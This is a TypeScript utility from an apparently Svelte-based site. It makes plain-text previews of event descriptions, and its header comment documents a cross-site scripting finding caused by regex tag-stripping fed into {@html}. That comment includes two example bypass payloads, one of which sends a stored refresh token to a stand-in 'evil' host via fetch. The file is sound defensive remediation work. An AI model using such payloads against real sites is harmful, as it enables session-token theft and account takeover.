/**
 * C-14 — plain-text previews of rich-text fields.
 *
 * The two `{@html}` sinks on the public event page rendered
 *
 *   {@html event.description.replace(/<[^>]*>/g, '').slice(0, 150)}
 *
 * A regex tag-strip is NOT a sanitiser, and re-parsing its output with
 * `{@html}` defeats whatever stripping it managed. Two one-line bypasses:
 *
 *   nested tag        `<<a>img src=x onerror=…>` — the regex consumes `<a>`,
 *                     leaving a live `<img>` behind
 *   unterminated tag  `<img src=x onerror=fetch('//evil/'+localStorage.auth_refresh_token)`
 *                     — no `>` anywhere, so the regex matches nothing at all
 *                     and the parser auto-closes the tag on insertion
 *
 * Both sinks live inside the *Presented by* card, so they fire on any event
 * belonging to a collection, and tokens are in `localStorage` (C-09).
 *
 * The real fix is not a better regex — it is not using `{@html}` for text.
 * This function returns a STRING that the caller interpolates with `{...}`,
 * so Svelte escapes it. The tag-stripping below is a display nicety (don't
 * show raw markup in a teaser), explicitly NOT a security control: even if it
 * missed everything, the output is escaped at the point of use.
 */

const DEFAULT_PREVIEW_LENGTH = 150;

/**
 * Strip markup from a rich-text value and truncate it for a teaser.
 *
 * @param value  the raw description; may be null/undefined
 * @param length characters to keep before the ellipsis
 */
export function stripTagsForPreview(
	value: string | null | undefined,
	length: number = DEFAULT_PREVIEW_LENGTH
): string {
	if (!value) return '';

	const text = String(value)
		// Complete tags.
		.replace(/<[^>]*>/g, '')
		// An UNTERMINATED trailing tag — the case the original regex could not
		// see. Kept because leaving `<img src=x onerror=...` visible as literal
		// text in a teaser looks broken, not because it is load-bearing.
		.replace(/<\/?[a-zA-Z][^]*$/, '')
		// Collapse the whitespace left behind by removed block tags.
		.replace(/\s+/g, ' ')
		.trim();

	return text.length > length ? `${text.slice(0, length)}…` : text;
}
